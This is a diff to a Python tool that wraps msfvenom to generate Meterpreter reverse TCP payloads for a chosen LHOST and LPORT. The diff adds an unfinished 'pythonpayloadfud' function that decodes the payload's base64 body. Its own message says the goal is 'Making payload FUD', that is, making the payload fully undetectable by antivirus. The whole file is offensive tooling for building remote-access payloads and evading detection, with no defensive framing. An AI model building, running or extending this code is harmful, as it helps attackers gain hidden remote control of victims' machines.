@@ -3,6 +3,7 @@ import colorama
 import subprocess
 import sys
 import re 
+import base64
 #custom import 
 import varsx 
 
@@ -70,7 +71,7 @@ def payloadgen1(payload, talkback, lhost, lport, outfile):
     subprocess.run(["msfvenom", "-p", payload + "/meterpreter/reverse_" + talkback, "LHOST=" + lhost, "LPORT=" + str(lport), "-o", outfile])    
 
 def pythonpayload():
-    global n 
+    global n, pyoutfile
     n = 1
     pyoutfile = varsx.pyoutfile
     #For copy pasting
@@ -86,16 +87,25 @@ def pythonpayload():
         pyoutfile = inputpy2
     #generate simple payload    
     if inputpy == "1":
+        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen1("python", "tcp", lhost, lport, pyoutfile)
+        print(colorama.Style.RESET_ALL)
     elif inputpy == "2": 
+        print(colorama.Fore.LIGHTCYAN_EX + "Generating payload...")
         payloadgen1("python", "tcp", lhost, lport, pyoutfile + ".tmp")    
         pythonpayloadfud()
 
 def pythonpayloadfud():
+    print("Making payload FUD...")
     pytempf = open(pyoutfile + ".tmp", "r")
-    pytempf.seek(79)
-
-
+    dat1 = pytempf.readline()
+    #part of file b4 base64 code
+    b4b64 = "getencoder('utf-8')('"
+    #part of file after
+    afb64 = "')[0]))"
+    b64pycode = re.search("\('utf-8'\)\('(.+)'\)\[0\]\)", dat1).group(1)
+    pycode = base64.b64decode(b64pycode)
+    
 
 def menu():
     prntopt("Create a python payload (MSF)")
